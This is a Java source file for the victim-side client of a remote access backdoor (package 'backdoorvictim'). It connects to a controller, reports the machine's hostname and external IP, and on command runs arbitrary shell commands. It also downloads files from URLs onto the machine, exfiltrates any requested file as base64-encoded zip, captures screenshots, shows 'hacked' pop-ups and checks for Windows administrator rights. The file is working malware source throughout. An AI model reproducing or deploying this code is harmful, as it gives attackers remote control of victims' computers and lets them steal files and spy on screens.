package backdoorvictim;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Base64;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import javax.imageio.ImageIO;

public class Victim implements Runnable {

    // Declaration section
    // clientClient: the client socket
    // os: the output stream
    // is: the input stream
    static Socket clientSocket = null;
    static PrintStream os = null;
    static DataInputStream is = null;
    static BufferedReader inputLine = null;
    static boolean closed = false;
    private static String ip = "";
    private static String whoami = "";
    private static String OS = System.getProperty("os.name").toLowerCase();
    private static File temp;

    public static void main(String[] args) throws UnknownHostException, InterruptedException {

        // The default port and ip
        int port_number = 4600;
        String host = "localhost";

        String hostname = InetAddress.getLocalHost().getHostName(); // find the hostname from computer
        try {
            URL whatismyip = new URL("http://checkip.amazonaws.com"); // check the external ip from the computer.
            BufferedReader in = new BufferedReader(new InputStreamReader(
                    whatismyip.openStream()));
            ip = in.readLine();

        } catch (Exception e) {
            ip = "noip";
        }
        whoami = hostname + "@" + ip + " ";

        System.out.println("Connecting to " + host + " on port " + port_number + "...");

        try {
            clientSocket = new Socket(host, port_number);
            inputLine = new BufferedReader(new InputStreamReader(System.in));
            os = new PrintStream(clientSocket.getOutputStream());
            is = new DataInputStream(clientSocket.getInputStream());
        } catch (UnknownHostException e) {
            System.err.println("Don't know about host " + host);
        } catch (IOException e) {
            System.err.println("Couldn't get I/O for the connection to the host " + host);
        }
        if (clientSocket != null && os != null && is != null) {
            try {

                new Thread(new Victim()).start();

                while (!closed) {
                    // read line text.
                    int a = 'a';
                    String s = "";
                    long begin = System.currentTimeMillis();
                    do {
                        if (System.currentTimeMillis() - begin > 10000) { // keepalive massage
                            begin = System.currentTimeMillis();
                            os.println("ping");
                        }
                        if (inputLine.ready()) {
                            a = inputLine.read();
                            if (a != 10) {
                                s = s + (char) a;
                            }
                        }
                    } while (a != 10);
                    os.println(s);

                }

                os.close();
                is.close();
                clientSocket.close();
            } catch (IOException e) {
                System.err.println("IOException:  " + e);
            }
        }
    }

    public void run() {
        String responseLine;

        try {
            while ((responseLine = is.readLine()) != null) {
                System.out.println(responseLine);
                if (responseLine.contains(whoami + "shell ")) { // send shell request
                    //int i = whoami.length() * 2 + 8;
                    int i = whoami.length() + 15;
                    String s = responseLine.substring(i);
                    os.println(ExecuteMyCommand(responseLine.substring(i)));
                }
                if (responseLine.contains(whoami + "upload ")) { // upload file to victim
                    //int i = whoami.length() * 2 + 8;
                    int i = whoami.length() + 16;
                    String s = responseLine.substring(i);
                    os.println("location of file is: " + upload(s));
                }
                if (responseLine.contains(whoami + "javaversion")) { // request javaversion only not jre or jdk with it.
                    os.println("java version from " + whoami + " is: " + System.getProperty("java.version"));
                }
                if (responseLine.contains(whoami + "download ")) { // download a file from the victim to the server.
                    //int i = whoami.length() * 2 + 8;
                    int i = whoami.length() + 18;
                    String s = responseLine.substring(i);
                    os.println("downloadeble file = " + download(s));
                }

                if (responseLine.contains(whoami + "screenshot")) { // request screenshot from victim.
                    os.println("screenshot: " + screenshot());
                }

                if (responseLine.contains(whoami + "msgbox")) { // send a popup message to victim.
                    try {
                        int i = whoami.length() + 16;
                        String s = responseLine.substring(i);
                        if (OS.contains("linux")) {
                            os.println("sending msgbox");
                            ExecuteMyCommand("zenity --error --text=\"" + s + "\\!\" --title=\"Warning\\!\"");
                            os.println("answer msgbox succes");
                        } else if (OS.contains("windows")) {
                            os.println("sending msgbox");
                            ExecuteMyCommand("mshta \"javascript:var sh=new ActiveXObject( 'WScript.Shell' ); sh.Popup( '" + s + "', 10, 'hacked', 64 );close()\"");
                            os.println("answer msgbox succes");
                        } else {
                            os.println("sending msgbox possibly faild");
                        }

                    } catch (Exception e) {
                        os.println("sending msgbox faild");
                    }
                }

                if (responseLine.contains("list info")) { // request many things from victim like: ip, hostname, OS, and admin or not if windows.
                    if (OS.contains("windows")) {
                        if (isAdmin() == true) {
                            os.println("online " + whoami + " = " + OS + " admin?= administrator");
                        } else {
                            os.println("online " + whoami + " = " + OS + " = admin?= not administrator");
                        }
                    }else{
                        os.println("online " + whoami + " = " + OS + " = admin?= ???");
                    }

                }

                if (responseLine.contains(whoami + "exit")) { // close connection remotely
                    System.exit(0);

                }
            }
              
        } catch (IOException e) {
            System.err.println("IOException:  " + e);

        } catch (AWTException ex) {
            Logger.getLogger(Victim.class.getName()).log(Level.SEVERE, null, ex);
        }

        System.err.println("Connection lost from " + whoami);
        closed = true;
    }

    public static String ExecuteMyCommand(String commando) { // here send we our command ( example "dir" as a command)

        try {
            if (commando.length() < 1) {
                return "no command try retry";
            }
            String outputlines = "";
            if (OS.contains("windows")) {
                Process p = Runtime.getRuntime().exec("cmd /c " + commando);
                BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));

                String regel = "";
                while ((regel = br.readLine()) != null) {
                    outputlines += regel + "\n"; 
                }
                return outputlines;
            }
            Process p = Runtime.getRuntime().exec(commando);
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));

            String regel = "";
            while ((regel = br.readLine()) != null) {
                outputlines += regel + "\n"; 
            }
            return outputlines;

        } catch (IOException ex) {
            return ex.getMessage();
        }
    }

    public static boolean isAdmin() { // check if were are heve admin acces.
        String groups[] = (new com.sun.security.auth.module.NTSystem()).getGroupIDs();
        for (String group : groups) {
            if (group.equals("S-1-5-32-544")) {
                return true;
            }
        }
        return false;
    }

    public static String upload(String file) throws IOException { // uploaden to victim from url.
        temp = File.createTempFile("temp", Long.toString(System.nanoTime()));
        URL url = new URL(file);
        InputStream in = url.openStream();
        Files.copy(in, Paths.get(temp.getAbsolutePath()), StandardCopyOption.REPLACE_EXISTING);
        in.close();
        return temp.getAbsolutePath();

    }

    public static String download(String file) throws IOException { // download from victim to server.
        try {
            File ziptemp = File.createTempFile("temp", Long.toString(System.nanoTime()));
            Path fileLocationzip = Paths.get(ziptemp.toString());

            // input file 
            FileInputStream in = new FileInputStream(file);

            // out put file 
            ZipOutputStream out = new ZipOutputStream(new FileOutputStream(ziptemp));

            // name the file inside the zip  file 
            out.putNextEntry(new ZipEntry("file"));

            // buffer size
            byte[] b = new byte[1024];
            int count;

            while ((count = in.read(b)) > 0) {
                out.write(b, 0, count);
            }
            out.close();
            in.close();

            byte[] zipdata = Files.readAllBytes(fileLocationzip);
            String base64encoded = Base64.getEncoder().encodeToString(zipdata);
            return base64encoded;
        } catch (IOException e) {
            System.err.println("file doesnt exist");
        }
        return "";
    }

    public static String screenshot() throws IOException, AWTException { // request screenshot from default screen from victim.
        temp = File.createTempFile("temp", Long.toString(System.nanoTime()));
        File ziptemp = File.createTempFile("temp", Long.toString(System.nanoTime()));
        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture, "bmp", new File(temp.toString()));
        Path fileLocationzip = Paths.get(ziptemp.toString());
        // input file 
        FileInputStream in = new FileInputStream(temp);

        // out put file 
        ZipOutputStream out = new ZipOutputStream(new FileOutputStream(ziptemp));

        // name the file inside the zip  file 
        out.putNextEntry(new ZipEntry("screenshot.bmp"));

        // buffer size
        byte[] b = new byte[1024];
        int count;

        while ((count = in.read(b)) > 0) {
            out.write(b, 0, count);
        }
        out.close();
        in.close();

        byte[] data = Files.readAllBytes(fileLocationzip);
        String base64encoded = Base64.getEncoder().encodeToString(data);
        return base64encoded;
      

    }
}
